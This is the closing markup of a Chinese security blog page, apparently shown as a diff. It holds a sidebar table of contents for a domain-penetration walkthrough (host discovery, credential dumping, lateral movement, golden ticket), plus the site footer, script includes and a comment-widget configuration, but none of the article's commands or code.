nav-level-5"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E4%B8%BB%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8"><span class="nav-number">1.4.3.2.4.</span> <span class="nav-text">查看主域控制器</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%AE%9A%E4%BD%8D%E4%B8%BB%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8"><span class="nav-number">1.4.3.2.5.</span> <span class="nav-text">定位主域控制器</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8E%A2%E6%B5%8B%E5%86%85%E7%BD%91%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA"><span class="nav-number">1.4.3.3.</span> <span class="nav-text">探测内网存活主机</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8EICMP%E5%8F%91%E7%8E%B0%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA"><span class="nav-number">1.4.3.3.1.</span> <span class="nav-text">基于ICMP发现存活主机</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8fscan%E6%89%AB%E6%8F%8F%E5%86%85%E7%BD%91%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA"><span class="nav-number">1.4.3.3.2.</span> <span class="nav-text">使用fscan扫描内网存活主机</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%94%A8%E6%88%B7%E5%87%AD%E6%8D%AE%E6%94%B6%E9%9B%86"><span class="nav-number">1.4.3.4.</span> <span class="nav-text">用户凭据收集</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%8A%93%E5%8F%96-Hash"><span class="nav-number">1.4.3.4.1.</span> <span class="nav-text">抓取 Hash</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%8A%93%E5%8F%96%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81"><span class="nav-number">1.4.3.4.2.</span> <span class="nav-text">抓取明文密码</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="nav-number">1.4.3.5.</span> <span class="nav-text">内网横向移动</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="nav-number">1.4.4.</span> <span class="nav-text">权限维持-黄金票据</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B6%88%E9%99%A4%E7%97%95%E8%BF%B9"><span class="nav-number">1.4.5.</span> <span class="nav-text">消除痕迹</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%89%93%E6%B3%95%E4%BA%8C"><span class="nav-number">1.5.</span> <span class="nav-text">打法二</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%81%94%E5%8A%A8%E8%9A%81%E5%89%91%E4%B8%8A%E7%BA%BFmsf"><span class="nav-number">1.5.1.</span> <span class="nav-text">联动蚁剑上线msf</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="nav-number">1.5.2.</span> <span class="nav-text">权限提升</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-1"><span class="nav-number">1.5.3.</span> <span class="nav-text">内网渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-1"><span class="nav-number">1.5.3.1.</span> <span class="nav-text">内网信息搜集</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-1"><span class="nav-number">1.5.3.2.</span> <span class="nav-text">域内信息搜集</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8E%A2%E6%B5%8B%E5%86%85%E7%BD%91%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA-1"><span class="nav-number">1.5.3.3.</span> <span class="nav-text">探测内网存活主机</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%94%A8%E6%88%B7%E5%87%AD%E6%8D%AE%E6%94%B6%E9%9B%86-1"><span class="nav-number">1.5.3.4.</span> <span class="nav-text">用户凭据收集</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%8A%93%E5%8F%96Hash"><span class="nav-number">1.5.3.4.1.</span> <span class="nav-text">抓取Hash</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%8A%93%E5%8F%96%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81-1"><span class="nav-number">1.5.3.4.2.</span> <span class="nav-text">抓取明文密码</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8-1"><span class="nav-number">1.5.3.5.</span> <span class="nav-text">内网横向移动</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="nav-number">1.6.</span> <span class="nav-text">参考文章</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="rev1ve"
+      src="/images/1.jpg">
+  <p class="site-author-name" itemprop="name">rev1ve</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">73</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">35</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2024-03 – 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">rev1ve</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : 'EbJd2uGnZROX6CGHpkKNkBAj-gzGzoHsz',
+      appKey     : 'KXq3KsjxZ28WDhwbOrLlm4Yw',
+      placeholder: "快来评论叭",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : true,
+      lang       : 'zh-cn' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : 'https://ebjd2ugn.lc-cn-n1-shared.com'
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
